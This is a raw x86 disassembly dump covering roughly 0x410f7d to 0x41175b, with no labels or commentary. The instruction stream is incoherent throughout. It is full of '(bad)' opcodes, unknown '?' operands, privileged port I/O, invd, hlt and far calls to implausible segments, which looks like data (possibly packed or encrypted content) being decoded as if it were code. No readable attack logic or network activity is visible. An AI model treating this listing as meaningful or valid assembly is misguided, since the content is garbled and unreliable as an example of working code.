  410f7d:	mov    bl,0x73
  410f7f:	icebp  
  410f80:	cmp    dh,al
  410f82:	loopne 0x410fea
  410f84:	mov    gs,WORD PTR [esi]
  410f86:	data16 mov dh,0xe4
  410f89:	(bad)  
  410f8a:	sub    eax,0xc2be2094
  410f8f:	in     eax,0x84
  410f91:	ins    BYTE PTR es:[edi],dx
  410f92:	cmp    dl,bh
  410f94:	aaa    
  410f95:	cdq    
  410f96:	mov    dl,0xb3
  410f98:	or     eax,0xd0234503
  410f9d:	pop    esp
  410f9e:	add    eax,0x74d1da2a
  410fa3:	push   ebp
  410fa4:	adc    eax,0xd55d9650
  410fa9:	rcl    dh,0xd2
  410fac:	cmp    ecx,DWORD PTR [edi+esi*2+0x6a170973]
  410fb3:	scas   al,BYTE PTR es:[edi]
  410fb4:	call   0xee86:0xe951a346
  410fbb:	push   0x6ae4dd7c
  410fc0:	mov    bh,0x3e
  410fc2:	into   
  410fc3:	pushf  
  410fc4:	xchg   ebx,eax
  410fc5:	lock das 
  410fc7:	dec    esp
  410fc8:	or     DWORD PTR [esi-0x6f],esp
  410fcb:	jge    0x410f64
  410fcd:	mov    WORD PTR [esi],?
  410fcf:	popf   
  410fd0:	mov    ch,0x9
  410fd2:	hlt    
  410fd3:	jmp    0x410faf
  410fd5:	adc    eax,0xed6ca53d
  410fda:	dec    BYTE PTR [ebx+ebp*8+0x35]
  410fde:	sbb    eax,DWORD PTR [ecx+0x43]
  410fe1:	sbb    al,0x80
  410fe3:	dec    eax
  410fe4:	add    ecx,DWORD PTR [eax-0x38]
  410fe7:	pop    es
  410fe8:	loop   0x410fc6
  410fea:	inc    edi
  410feb:	sti    
  410fec:	shr    cl,cl
  410fee:	mov    eax,ds:0xe5cc3c08
  410ff3:	dec    edx
  410ff4:	xor    al,0x6a
  410ff6:	(bad)  
  410ff7:	pop    ebx
  410ff8:	mov    al,ds:0x36367b62
  410ffd:	fs or  esi,edx
  411000:	jp     0x41104d
  411002:	adc    al,BYTE PTR [ebp-0x773907e9]
  411008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411009:	pop    ebx
  41100a:	icebp  
  41100b:	mov    DWORD PTR [esi-0x67],0xddeb9cbe
  411012:	nop
  411013:	jp     0x411009
  411015:	shl    BYTE PTR ds:0xec24ce93,1
  41101b:	jle    0x411054
  41101d:	push   ss
  41101e:	loopne 0x410faf
  411020:	bound  ecx,QWORD PTR [ebp-0x4a]
  411023:	imul   ebp,ecx,0x6291f450
  411029:	shl    BYTE PTR [ebp-0x5e8ab8cb],cl
  41102f:	xor    BYTE PTR [edx],al
  411031:	mov    ah,bh
  411033:	out    dx,al
  411034:	mov    dh,0xa1
  411036:	or     DWORD PTR [eax+0xf44a2fb],esi
  41103c:	xchg   ebx,eax
  41103d:	std    
  41103e:	outs   dx,DWORD PTR ds:[esi]
  41103f:	add    edx,ebx
  411041:	xor    al,0x2c
  411043:	outs   dx,DWORD PTR ds:[esi]
  411044:	(bad)  
  411046:	xlat   BYTE PTR ds:[ebx]
  411047:	and    DWORD PTR [esp+ebx*1],0xffffffc6
  41104b:	sti    
  41104c:	cmp    dh,BYTE PTR [esi-0xb]
  41104f:	fwait
  411050:	jge    0x41108a
  411052:	ret    
  411053:	xchg   BYTE PTR [edi-0x325f73b2],ah
  411059:	push   0x13
  41105b:	out    dx,eax
  41105c:	sbb    eax,0xf62131c4
  411061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411062:	shl    DWORD PTR cs:[eax+0x5c],1
  411066:	dec    edi
  411067:	push   ds
  411068:	in     eax,dx
  411069:	sbb    DWORD PTR [ebx+0x3543951c],ecx
  41106f:	in     al,0xc4
  411071:	pop    edx
  411072:	pop    ecx
  411073:	xchg   ebx,eax
  411074:	xor    dh,BYTE PTR [ebp-0x25b2712f]
  41107a:	data16 repz hlt 
  41107d:	sti    
  41107e:	jge    0x41100f
  411080:	int3   
  411081:	(bad)  
  411082:	jne    0x411004
  411084:	test   eax,edi
  411086:	pop    ecx
  411087:	arpl   WORD PTR [ebp+0x7e],cx
  41108a:	xlat   BYTE PTR ds:[ebx]
  41108b:	cmp    dl,dl
  41108d:	rcl    BYTE PTR [esi+0x3d],0x29
  411091:	mov    BYTE PTR [ecx+0x22384ab0],0x3d
  411098:	into   
  411099:	xor    esp,edi
  41109b:	dec    eax
  41109c:	cmc    
  41109d:	je     0x41106a
  41109f:	push   edx
  4110a0:	xchg   esi,eax
  4110a1:	xor    DWORD PTR [ecx-0x2748cd10],ecx
  4110a7:	or     DWORD PTR [eax],esi
  4110a9:	les    esp,FWORD PTR [esi+ebx*1]
  4110ac:	das    
  4110ad:	inc    edi
  4110ae:	rol    DWORD PTR [eax-0x210dbe3],cl
  4110b4:	ficom  WORD PTR [esi+0x3c8da2ae]
  4110ba:	stos   BYTE PTR es:[edi],al
  4110bb:	int    0x5c
  4110bd:	dec    esp
  4110be:	popa   
  4110bf:	stos   BYTE PTR es:[edi],al
  4110c0:	daa    
  4110c1:	push   ecx
  4110c2:	icebp  
  4110c3:	jmp    0x7da10be7
  4110c8:	or     eax,0xd715ee52
  4110cd:	dec    eax
  4110ce:	cmp    ah,al
  4110d0:	push   esi
  4110d1:	cmp    ebp,DWORD PTR [edx+0x79]
  4110d4:	mov    dl,0xb8
  4110d6:	push   esi
  4110d7:	push   esi
  4110d8:	sahf   
  4110d9:	mov    bh,0x86
  4110db:	ror    DWORD PTR [ecx-0x76],cl
  4110de:	lea    eax,[esp+ebp*8+0x47]
  4110e2:	ret    0xad80
  4110e5:	std    
  4110e6:	fincstp 
  4110e8:	or     al,0x1d
  4110ea:	fwait
  4110eb:	sub    bh,BYTE PTR [ebp+0x38]
  4110ee:	nop
  4110ef:	bound  edi,QWORD PTR [esi]
  4110f1:	jo     0x4110e4
  4110f3:	or     ecx,ecx
  4110f5:	push   ecx
  4110f6:	adc    eax,0xda37df86
  4110fb:	sub    eax,0xb7bff0d8
  411100:	mov    esi,0x4f485a4e
  411105:	push   0x49
  411107:	cmp    cl,BYTE PTR [edx+0x27]
  41110a:	mov    cl,0xc7
  41110c:	ins    DWORD PTR es:[edi],dx
  41110d:	pusha  
  41110e:	test   al,0xc1
  411110:	sub    DWORD PTR [eax+0x68fed565],ebp
  411116:	(bad)  
  411117:	jmp    0x411135
  411119:	jns    0x41111d
  41111b:	mov    eax,0x86ef224d
  411120:	es inc esp
  411122:	xchg   dh,ah
  411124:	scas   eax,DWORD PTR es:[edi]
  411125:	call   0x1b511289
  41112a:	(bad)  
  41112b:	in     eax,0x17
  41112d:	adc    BYTE PTR [ebp+0x7b1f3021],dl
  411133:	fimul  DWORD PTR [ebx]
  411135:	(bad)  
  411136:	es dec edx
  411138:	push   ss
  411139:	jnp    0x41110b
  41113b:	add    ah,cl
  41113d:	aas    
  41113e:	fist   DWORD PTR [edi+0x18ed7dff]
  411144:	xchg   ebp,eax
  411145:	fcomp  QWORD PTR [edx-0x43]
  411148:	push   edi
  411149:	into   
  41114a:	xchg   BYTE PTR [ecx],ch
  41114c:	mov    eax,ds:0x260504fa
  411151:	sbb    DWORD PTR [edx-0x6c2421f3],0xc1e55d26
  41115b:	mov    eax,ds:0x6eefb975
  411160:	out    0xf6,al
  411162:	leave  
  411163:	xlat   BYTE PTR ds:[ebx]
  411164:	cmp    dh,BYTE PTR [esi-0x6b]
  411167:	cmp    BYTE PTR [ebx],bh
  411169:	push   eax
  41116a:	adc    al,0x99
  41116c:	nop
  41116d:	mov    esp,0x9e4f8c6a
  411172:	pusha  
  411173:	fidiv  DWORD PTR [ebp-0x62]
  411176:	sbb    ebx,edi
  411178:	sub    BYTE PTR [edx-0x4137eadf],0x87
  41117f:	cwde   
  411180:	mov    ebp,0xead14717
  411185:	test   eax,0xf8784064
  41118a:	and    BYTE PTR [esi-0x75],ch
  41118d:	xchg   esp,eax
  41118e:	loopne 0x41113c
  411190:	lods   al,BYTE PTR ds:[esi]
  411191:	or     eax,0x4befc400
  411196:	call   0x1fa5:0xd36e7d09
  41119d:	fistp  DWORD PTR [ecx+esi*4+0x37445ed]
  4111a4:	pop    ss
  4111a5:	dec    esp
  4111a6:	retf   
  4111a7:	cmp    bl,BYTE PTR [edi-0x5bf9e997]
  4111ad:	add    eax,eax
  4111af:	pop    ecx
  4111b0:	dec    esp
  4111b1:	dec    ecx
  4111b2:	xor    al,0xeb
  4111b4:	xchg   esp,eax
  4111b5:	cmc    
  4111b6:	mov    bh,BYTE PTR [edi]
  4111b8:	mov    ds:0x2960dd56,eax
  4111bd:	cmp    eax,0xcb0fff1c
  4111c2:	pop    ecx
  4111c3:	dec    esp
  4111c4:	not    DWORD PTR [ecx-0x5]
  4111c7:	in     eax,0x8f
  4111c9:	or     ebx,DWORD PTR [eax+0x29cab042]
  4111cf:	pop    eax
  4111d0:	pop    edx
  4111d1:	mov    al,ds:0xa1354ffd
  4111d6:	mov    edi,0xae49a93
  4111db:	xchg   edx,eax
  4111dc:	ret    
  4111dd:	pop    ecx
  4111de:	out    0xe8,eax
  4111e0:	adc    eax,0xc1782cc
  4111e5:	(bad)  
  4111e6:	invd   
  4111e8:	retf   0x9efa
  4111eb:	push   cs
  4111ec:	cmp    ch,BYTE PTR [ecx]
  4111ee:	jne    0x4111a4
  4111f0:	push   edi
  4111f1:	cdq    
  4111f2:	je     0x41124b
  4111f4:	jae    0x411224
  4111f6:	(bad)  
  4111f7:	and    DWORD PTR [edi+eax*8],0xffffff94
  4111fb:	ss xchg esi,eax
  4111fd:	or     al,0xc4
  4111ff:	cmp    ah,dh
  411201:	mov    dl,0x9c
  411203:	call   0x9f0b:0xd85de09e
  41120a:	jecxz  0x41127b
  41120c:	popf   
  41120d:	jmp    0x411191
  41120f:	out    0x8e,eax
  411211:	jmp    0x25ad:0x524519f4
  411218:	imul   edi,esi,0xb1b5525d
  41121e:	mov    al,ds:0x34cc6cd6
  411223:	arpl   WORD PTR [edx+edx*2-0x4361ad49],cx
  41122a:	scas   eax,DWORD PTR es:[edi]
  41122b:	jge    0x41124d
  41122d:	fsub   QWORD PTR [eax]
  41122f:	loopne 0x4111eb
  411231:	leave  
  411232:	or     DWORD PTR [eax],edi
  411234:	add    ebp,edi
  411236:	sub    eax,0x5bf54a87
  41123b:	sahf   
  41123c:	aad    0xe3
  41123e:	rol    BYTE PTR [ecx+0x49],cl
  411241:	pop    es
  411242:	push   ds
  411243:	das    
  411244:	cwde   
  411245:	inc    esi
  411246:	pop    ds
  411247:	outs   dx,DWORD PTR ds:[esi]
  411248:	out    dx,eax
  411249:	xchg   ebp,esp
  41124b:	and    ch,BYTE PTR [ebx+0x7c5ebc27]
  411251:	aas    
  411252:	jno    0x411268
  411254:	xor    DWORD PTR [ebp+0x437238ca],ecx
  41125a:	pop    ss
  41125b:	pop    es
  41125c:	xchg   edi,eax
  41125d:	fild   DWORD PTR [edi-0x244baa49]
  411263:	daa    
  411264:	mov    edx,0xeeaaddd7
  411269:	daa    
  41126a:	bound  esp,QWORD PTR [edx+0x47]
  41126d:	test   BYTE PTR [ebp+edx*2-0x733e51cd],al
  411274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411275:	mov    ch,0x5e
  411277:	sbb    DWORD PTR [esi],eax
  411279:	and    al,0x2c
  41127b:	inc    esp
  41127c:	sub    al,0x15
  41127e:	(bad)  
  41127f:	jo     0x411227
  411281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411282:	push   edx
  411283:	pushf  
  411284:	in     eax,0x52
  411286:	cmp    BYTE PTR [ecx],dh
  411288:	sar    eax,0xb0
  41128b:	shl    DWORD PTR ds:0x45a3d05c,0x92
  411292:	or     BYTE PTR [edi-0x6d82690d],cl
  411298:	rcl    BYTE PTR [edx],1
  41129a:	inc    esi
  41129b:	scas   eax,DWORD PTR es:[edi]
  41129c:	or     DWORD PTR [ebp*2+0x601dca3c],esp
  4112a3:	add    ch,BYTE PTR [eax]
  4112a5:	int3   
  4112a6:	test   eax,0x81f67f13
  4112ab:	jg     0x411235
  4112ad:	push   edx
  4112ae:	dec    ecx
  4112af:	data16 fwait
  4112b1:	loopne 0x411263
  4112b3:	sahf   
  4112b4:	mov    ebx,0x6ec9d45e
  4112b9:	cld    
  4112ba:	pop    edx
  4112bb:	fst    QWORD PTR [ebx]
  4112bd:	sbb    BYTE PTR [ebp+0x10],cl
  4112c0:	jbe    0x411243
  4112c2:	add    eax,0xa6371690
  4112c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c8:	jnp    0x41133a
  4112ca:	pop    eax
  4112cb:	test   BYTE PTR [edx-0x2be67f25],ch
  4112d1:	and    DWORD PTR ds:0x5c30726e,edi
  4112d7:	push   ebp
  4112d8:	or     bl,0xef
  4112db:	xor    dl,BYTE PTR [eax-0x6176fd0]
  4112e1:	std    
  4112e2:	push   ecx
  4112e3:	mov    ds:0x7d4fcceb,eax
  4112e8:	pop    eax
  4112e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ea:	(bad)  
  4112eb:	in     al,0x6
  4112ed:	mov    dh,dl
  4112ef:	cwde   
  4112f0:	xchg   ecx,eax
  4112f1:	hlt    
  4112f2:	ins    BYTE PTR es:[edi],dx
  4112f3:	pop    ebp
  4112f4:	and    DWORD PTR ds:0x8bfa3a57,0xfffffff2
  4112fb:	popf   
  4112fc:	xchg   cl,bh
  4112fe:	xor    ebp,ecx
  411300:	imul   ebx,DWORD PTR [esi+0x3c],0xa302097a
  411307:	mov    ebp,0xd98618d0
  41130c:	fwait
  41130d:	aaa    
  41130e:	add    bh,0xe1
  411311:	fbstp  TBYTE PTR [ecx-0x2cf5e02c]
  411317:	jmp    0xdc028be
  41131c:	fist   DWORD PTR [edi+0x5587a43f]
  411322:	sbb    eax,0x2d826fe3
  411327:	push   0x40dab193
  41132c:	test   al,0x47
  41132e:	ret    0x722c
  411331:	sub    BYTE PTR [ebx+0x613ef661],0x6f
  411338:	fistp  DWORD PTR [eax]
  41133a:	cdq    
  41133b:	add    dl,dh
  41133d:	in     eax,0xc4
  41133f:	jns    0x411384
  411341:	(bad)  
  411344:	repz inc ebx
  411346:	sbb    dl,ch
  411348:	mov    ebp,0xca4e5f83
  41134d:	xchg   DWORD PTR [eax+0x1b6231f9],ecx
  411353:	mov    eax,ds:0xd6c7c82c
  411358:	inc    eax
  411359:	sbb    dl,BYTE PTR [edx]
  41135b:	mov    edx,0xb9d6b09c
  411360:	arpl   di,sp
  411362:	cmp    esp,DWORD PTR fs:[ecx-0x1c8dadcd]
  411369:	dec    edi
  41136a:	call   0x3bffab51
  41136f:	mov    dh,0x8b
  411371:	jnp    0x4113c2
  411373:	es aas 
  411375:	dec    esi
  411376:	xor    BYTE PTR [edx],0x1d
  411379:	daa    
  41137a:	add    bl,ah
  41137c:	or     bl,al
  41137e:	je     0x411307
  411380:	dec    eax
  411381:	pusha  
  411382:	jb     0x4113e7
  411384:	out    dx,eax
  411385:	mov    cl,0x3d
  411387:	in     eax,0x82
  411389:	cmc    
  41138a:	inc    edi
  41138b:	stos   BYTE PTR es:[edi],al
  41138c:	lahf   
  41138d:	xor    BYTE PTR [edx-0x475428bc],bh
  411393:	add    DWORD PTR [edx-0x46],0xffffff99
  411397:	popf   
  411398:	sub    DWORD PTR [esi+0x15baa297],ecx
  41139e:	jae    0x4113f5
  4113a0:	pinsrw mm7,WORD PTR [edx+ebp*2-0x7c],0x79
  4113a6:	cwde   
  4113a7:	push   esi
  4113a8:	inc    edx
  4113a9:	mov    BYTE PTR [ebp+0x2796627],0x41
  4113b0:	jne    0x4113d6
  4113b2:	sar    DWORD PTR [ebp-0x31],1
  4113b5:	out    0x9e,eax
  4113b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113b8:	jl     0x411388
  4113ba:	das    
  4113bb:	or     ecx,0xffffffc2
  4113be:	push   dx
  4113c0:	push   0x901c8eaa
  4113c5:	jmp    FWORD PTR [eax+0x44]
  4113c8:	push   edi
  4113c9:	imul   ebx,DWORD PTR [ecx+0x49],0xc1d6a93a
  4113d0:	xor    edi,ebx
  4113d2:	icebp  
  4113d3:	les    eax,FWORD PTR [esp+ecx*8+0x45]
  4113d7:	dec    DWORD PTR [ebx+0x6467d194]
  4113dd:	sbb    esp,DWORD PTR [edi-0x36bfcf57]
  4113e3:	and    eax,0x3cd77501
  4113e8:	mov    cl,0x18
  4113ea:	ins    DWORD PTR es:[edi],dx
  4113eb:	jb     0x411443
  4113ed:	cmp    BYTE PTR [edx-0x23],bl
  4113f0:	jmp    0x41146c
  4113f2:	adc    DWORD PTR [edx+0xc],edx
  4113f5:	mov    ebp,0xf1b6219c
  4113fa:	gs mov esi,0x1fedcac
  411400:	fcomp  DWORD PTR [ebp+0x1e]
  411403:	fistp  QWORD PTR [ecx+0x70294a2c]
  411409:	bound  eax,QWORD PTR [esi]
  41140b:	shl    DWORD PTR [esi+0x4abecdcb],0x2d
  411412:	cmp    edx,0xf72f0f1c
  411418:	cli    
  411419:	push   esp
  41141a:	sbb    eax,0x285c3ddf
  41141f:	mov    ebp,0x99d2f28
  411424:	dec    ecx
  411425:	xchg   ebx,esi
  411427:	jo     0x411469
  411429:	test   BYTE PTR [edx],cl
  41142b:	add    BYTE PTR [edx],bl
  41142d:	in     al,0xed
  41142f:	mov    ?,esi
  411431:	sbb    DWORD PTR [edi],0xffffffe1
  411434:	imul   ebp,DWORD PTR [esi+0x1a],0x539d2849
  41143b:	retf   0x7894
  41143e:	push   0x92ff670d
  411443:	loop   0x4113f6
  411445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411446:	fisttp WORD PTR [ecx-0x6d]
  411449:	xchg   ebp,eax
  41144a:	and    BYTE PTR [edi+0x6d],dl
  41144d:	test   al,ch
  41144f:	fld    DWORD PTR [edi+0x7c]
  411452:	shl    BYTE PTR es:[ecx+0x68],1
  411456:	jg     0x411496
  411458:	add    eax,0x81dd9fe5
  41145d:	cmp    DWORD PTR [eax-0x4d8c475d],ecx
  411463:	cwde   
  411464:	jbe    0x411462
  411466:	div    edx
  411468:	xor    eax,0x3b383ff4
  41146d:	stc    
  41146e:	xor    bl,BYTE PTR [ecx]
  411470:	pop    ds
  411471:	mov    ah,0x92
  411473:	imul   esi,DWORD PTR [ebp-0x7d74f154],0xffffffa3
  41147a:	and    DWORD PTR [edi],ecx
  41147c:	dec    esi
  41147d:	ficomp DWORD PTR [ebp-0x675e6cf1]
  411483:	add    BYTE PTR [edx+ecx*8+0x214364d5],dh
  41148a:	ja     0x41147c
  41148c:	jne    0x411418
  41148e:	cmc    
  41148f:	add    al,0x2f
  411491:	pop    esi
  411492:	ret    0x3077
  411495:	idiv   eax
  411497:	push   ds
  411498:	add    DWORD PTR [edi-0x44],eax
  41149b:	dec    edx
  41149c:	stos   BYTE PTR es:[edi],al
  41149d:	scas   al,BYTE PTR es:[edi]
  41149e:	sbb    ebx,DWORD PTR [edi+0x2]
  4114a1:	test   BYTE PTR [ecx-0x51451a50],ch
  4114a7:	repz icebp 
  4114a9:	ja     0x4114a3
  4114ab:	imul   ecx,DWORD PTR [ebx+0x4f26df2a],0x807bf18a
  4114b5:	mov    ebx,0x6b6564e5
  4114ba:	imul   ecx,DWORD PTR [eax-0x1afacea3],0x9cfa081a
  4114c4:	loop   0x41147e
  4114c6:	outs   dx,BYTE PTR ds:[esi]
  4114c7:	sub    al,BYTE PTR [esi]
  4114c9:	popa   
  4114ca:	rol    BYTE PTR [ebx+0x0],1
  4114cd:	test   al,0x82
  4114cf:	loope  0x4114a4
  4114d1:	aas    
  4114d2:	push   0x78c719f9
  4114d7:	add    al,0x15
  4114d9:	push   eax
  4114da:	cmc    
  4114db:	dec    edi
  4114dc:	mov    al,0x6f
  4114de:	dec    ebp
  4114df:	out    0xa2,al
  4114e1:	cwde   
  4114e2:	(bad)  
  4114e3:	daa    
  4114e4:	popf   
  4114e5:	push   ebp
  4114e6:	mov    dl,0x76
  4114e8:	stc    
  4114e9:	out    0x51,eax
  4114eb:	sub    BYTE PTR [ebx+0x1ee1159],ah
  4114f1:	ja     0x411485
  4114f3:	stos   DWORD PTR es:[edi],eax
  4114f4:	jmp    0x4114f6
  4114f6:	cld    
  4114f7:	out    dx,al
  4114f8:	add    al,0xef
  4114fa:	aaa    
  4114fb:	pop    esi
  4114fc:	shl    BYTE PTR [ebx+0x35b0bf3b],cl
  411502:	ins    BYTE PTR es:[edi],dx
  411503:	xchg   edi,eax
  411504:	das    
  411505:	sbb    DWORD PTR [ecx-0x61],ecx
  411508:	daa    
  411509:	lea    esi,[edi+0xf]
  41150c:	pop    ds
  41150d:	(bad)  
  41150e:	cli    
  41150f:	rcr    ch,cl
  411511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411512:	shl    BYTE PTR [esi],1
  411514:	int3   
  411515:	icebp  
  411516:	or     al,0x26
  411518:	cmp    al,0x0
  41151a:	cmp    BYTE PTR [ebp-0x43],al
  41151d:	(bad)  
  41151e:	and    bl,BYTE PTR [esi]
  411520:	sbb    eax,0x45844035
  411525:	mov    fs,WORD PTR [ecx+0xaece95b]
  41152b:	jae    0x4115a6
  41152d:	or     esp,DWORD PTR [ebx+0x53]
  411530:	into   
  411531:	imul   edx,DWORD PTR [eax+0x563c7d7d],0x3f
  411538:	dec    edi
  411539:	xchg   ebp,eax
  41153a:	lahf   
  41153b:	stos   DWORD PTR es:[edi],eax
  41153c:	test   al,0xbb
  41153e:	sub    cl,dl
  411540:	xor    edi,edi
  411542:	jmp    0x5a576cc7
  411547:	cwde   
  411548:	aas    
  411549:	ret    
  41154a:	pop    ds
  41154b:	push   edi
  41154c:	xchg   ecx,eax
  41154d:	mov    bl,al
  41154f:	test   al,0xd4
  411551:	call   0xcdf9ad53
  411556:	and    edx,esp
  411558:	lahf   
  411559:	mov    bl,0x24
  41155b:	stos   DWORD PTR es:[edi],eax
  41155c:	arpl   WORD PTR [esi],cx
  41155e:	popa   
  41155f:	loope  0x41151a
  411561:	fucomp st(0)
  411563:	lods   al,BYTE PTR ds:[esi]
  411564:	test   BYTE PTR [ebp+ebx*1-0x4b6476da],cl
  41156b:	ins    BYTE PTR es:[edi],dx
  41156c:	push   eax
  41156d:	stos   BYTE PTR es:[edi],al
  41156e:	cld    
  41156f:	lods   al,BYTE PTR ds:[esi]
  411570:	fs xchg esi,eax
  411572:	in     al,0x3b
  411574:	test   DWORD PTR [eax+ebx*1+0x6e],esi
  411578:	dec    edx
  411579:	pop    ds
  41157a:	in     al,0x70
  41157c:	das    
  41157d:	xchg   ebp,eax
  41157e:	dec    ebp
  41157f:	iret   
  411580:	or     eax,DWORD PTR [eax+0x3e]
  411583:	mov    eax,ds:0x64ca7320
  411588:	xchg   ecx,eax
  411589:	dec    esi
  41158a:	fs dec esi
  41158c:	adc    dl,BYTE PTR [esi+ecx*4]
  41158f:	xor    BYTE PTR [eax-0x45],ch
  411592:	jle    0x411555
  411594:	inc    ebp
  411595:	retf   
  411596:	inc    ecx
  411597:	scas   eax,DWORD PTR es:[edi]
  411598:	or     eax,0xf51d19a1
  41159d:	sub    eax,0x3025cc99
  4115a2:	push   edx
  4115a3:	test   DWORD PTR [esi+0x5c16f017],ecx
  4115a9:	popa   
  4115aa:	cmp    dh,dl
  4115ac:	in     al,dx
  4115ad:	leave  
  4115ae:	retf   0xedd4
  4115b1:	mov    edi,0x1c3b04e8
  4115b6:	daa    
  4115b7:	dec    esp
  4115b8:	adc    DWORD PTR [ebx],edi
  4115ba:	repz scas al,BYTE PTR es:[edi]
  4115bc:	rcr    BYTE PTR [eax],0x62
  4115bf:	dec    eax
  4115c0:	ret    0x104b
  4115c3:	nop
  4115c4:	sti    
  4115c5:	cmp    BYTE PTR [esi+0x45],ch
  4115c8:	mov    al,0x82
  4115ca:	pusha  
  4115cb:	mov    edx,0x50f50cef
  4115d0:	xor    ah,BYTE PTR [edi]
  4115d2:	not    DWORD PTR [edx]
  4115d4:	or     al,0x38
  4115d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d7:	or     al,0x64
  4115d9:	adc    eax,0x968808df
  4115de:	xor    ch,BYTE PTR [ecx-0x9]
  4115e1:	sbb    eax,0x6571f25a
  4115e6:	or     DWORD PTR [esi],0x1be59182
  4115ec:	push   esp
  4115ed:	pop    ss
  4115ee:	cmp    edi,DWORD PTR [eax+0x2a]
  4115f1:	sub    BYTE PTR [ebp-0x10ae36ec],ah
  4115f7:	pop    es
  4115f8:	xor    BYTE PTR [edx+0x6bee101b],al
  4115fe:	jbe    0x4115a6
  411600:	xor    bl,BYTE PTR [ebp-0x2d]
  411603:	mov    WORD PTR [edx],es
  411605:	push   edx
  411606:	inc    edx
  411607:	sbb    al,BYTE PTR [esp+ebx*1-0x73]
  41160b:	out    dx,eax
  41160c:	xor    bh,dl
  41160e:	xor    DWORD PTR [ebx+0x95d7bcf],ebp
  411614:	pop    esi
  411615:	addr16 mov ah,0xa0
  411618:	cmp    eax,0x69d44760
  41161d:	sub    eax,0x85b2c12e
  411622:	mov    eax,0xc9925e92
  411627:	xchg   edi,eax
  411628:	(bad)  
  411629:	enter  0x4b6f,0x3c
  41162d:	call   0x9a55f1f2
  411632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411633:	cs stos BYTE PTR es:[edi],al
  411635:	xor    ebx,DWORD PTR [eax-0x1f689f24]
  41163b:	loope  0x411660
  41163d:	shr    BYTE PTR [edx-0xe],1
  411640:	mov    DWORD PTR [edx],ebx
  411642:	jbe    0x411676
  411644:	ja     0x411685
  411646:	stos   DWORD PTR es:[edi],eax
  411647:	(bad)  
  411648:	jmp    0xb199:0x7d1e69a
  41164f:	stos   BYTE PTR es:[edi],al
  411650:	loopne 0x4115f5
  411652:	and    eax,0xe2c6a4e2
  411657:	mov    dh,0xf0
  411659:	jle    0x411622
  41165b:	or     DWORD PTR [ecx-0xa],edi
  41165e:	cmc    
  41165f:	fwait
  411660:	or     dl,bl
  411662:	dec    eax
  411663:	(bad)  [edx-0x498533d8]
  411669:	dec    ebx
  41166a:	mov    cl,BYTE PTR [esi+0x2e080d1e]
  411670:	int    0xe
  411672:	ds lahf 
  411674:	and    al,0xea
  411676:	xchg   edx,eax
  411677:	scas   al,BYTE PTR es:[edi]
  411678:	push   ecx
  411679:	cmp    edi,DWORD PTR [ecx-0x43]
  41167c:	pusha  
  41167d:	repz hlt 
  41167f:	(bad)  
  411680:	cmp    al,0x5e
  411682:	lds    esi,FWORD PTR ds:0x4de4f1e3
  411688:	add    DWORD PTR [esi+eiz*8+0xf],eax
  41168c:	mov    dl,BYTE PTR [ebx-0x61]
  41168f:	das    
  411690:	mov    edi,0xef5975d6
  411695:	cmp    dl,BYTE PTR [ecx]
  411697:	or     eax,0xf1b4677f
  41169c:	xchg   DWORD PTR [esi+0x1],edi
  41169f:	cmc    
  4116a0:	out    dx,al
  4116a1:	add    eax,0xee8f2e64
  4116a6:	cdq    
  4116a7:	pop    si
  4116a9:	jmp    0x411649
  4116ab:	push   ecx
  4116ac:	retf   
  4116ad:	push   esp
  4116ae:	pusha  
  4116af:	or     DWORD PTR [edx-0x35],esi
  4116b2:	enter  0x84e7,0xaa
  4116b6:	pop    ebx
  4116b7:	ficomp WORD PTR [ebx]
  4116b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ba:	sbb    DWORD PTR [edi],edi
  4116bc:	add    al,0x75
  4116be:	push   0x5c07a40a
  4116c3:	or     eax,0x338dbf8f
  4116c8:	xor    eax,0x6faa1da2
  4116cd:	adc    BYTE PTR [edx-0x2a],al
  4116d0:	arpl   WORD PTR [esi+eax*2],dx
  4116d3:	pop    esi
  4116d4:	push   ss
  4116d5:	popf   
  4116d6:	xor    DWORD PTR [eax+0x381458d2],0xffffff8c
  4116dd:	xor    dl,ah
  4116df:	addr16 out 0xba,al
  4116e2:	rcl    bh,0xe5
  4116e5:	retf   
  4116e6:	test   al,0xc6
  4116e8:	loope  0x4116dc
  4116ea:	test   BYTE PTR [eax+0x27098ffd],0xdc
  4116f1:	inc    edx
  4116f2:	ins    DWORD PTR es:[edi],dx
  4116f3:	icebp  
  4116f4:	test   al,0x51
  4116f6:	inc    ecx
  4116f7:	cmp    al,0x98
  4116f9:	imul   ebp,DWORD PTR [edx],0xfffffffa
  4116fc:	cmp    eax,0x8135f860
  411701:	and    eax,0xb1571b
  411706:	dec    esi
  411707:	das    
  411708:	inc    ebp
  411709:	push   ss
  41170a:	cmc    
  41170b:	(bad)  
  41170c:	aas    
  41170d:	inc    ebx
  41170e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41170f:	jp     0x4116f3
  411711:	cwde   
  411712:	pop    esp
  411713:	dec    ebx
  411714:	test   al,0x7d
  411716:	or     esi,DWORD PTR [edi-0x24]
  411719:	sahf   
  41171a:	pop    es
  41171b:	mov    al,ds:0x21912612
  411720:	pop    edi
  411721:	popa   
  411722:	inc    edi
  411723:	sbb    ch,BYTE PTR [eax-0x5c]
  411726:	push   edi
  411727:	and    al,0x71
  411729:	jp     0x411754
  41172b:	xor    BYTE PTR [ebx+0x67b81140],ch
  411731:	sub    dl,BYTE PTR [ebp-0x8e7cabb]
  411737:	and    ecx,DWORD PTR [eax+ebx*1]
  41173a:	mov    ss,WORD PTR [ecx]
  41173c:	jmp    0x9616:0x3170572c
  411743:	jnp    0x41170b
  411745:	adc    cl,BYTE PTR [ebx+0x26]
  411748:	lds    ecx,FWORD PTR [eax+eax*2-0x70fe51a9]
  41174f:	inc    ecx
  411750:	push   0x3a7e4eda
  411755:	inc    edi
  411756:	xor    al,0xa7
  411758:	fwait
  411759:	or     dl,ch
  41175b:	adc    eax,0x136d581d
